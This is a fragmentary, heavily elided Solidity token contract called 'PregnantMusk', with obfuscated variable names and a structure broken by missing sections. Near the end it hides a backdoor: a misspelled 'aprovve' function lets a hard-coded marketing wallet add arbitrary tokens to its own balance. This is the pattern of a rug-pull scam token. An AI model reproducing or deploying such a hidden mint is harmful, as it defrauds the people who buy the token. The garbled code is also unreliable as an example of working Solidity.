...
contract Context {
 ...
 contract PregnantMusk is Context, ERC20, ERC20Metadata {
    ...
    mapping(address => uint256) private superfloPREGO;
    ...
    uint256 private cryfalePREGO = 4;
    uint256 private _vebegoPREGO = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloPREGO[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletPREGO = 0xCB228198294eC7d09456FDEe3206a81E8685a87C;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloPREGO[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloPREGO[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfalePREGO / 100) / _vebegoPREGO;
        allons = allons -  (_fee * _vebegoPREGO);
        
        superfloPREGO[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaPREGO) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloPREGO[account];
        require(accountBalance >= gzillaPREGO, "BEP : Can't be done");
        unchecked {
            superfloPREGO[account] = accountBalance - gzillaPREGO;
        }
        _totalSupply -= gzillaPREGO;

        emit Transfer(account, address(0), gzillaPREGO);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloPREGO[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletPREGO, "ERC20: cannot permit dev address");
    }   
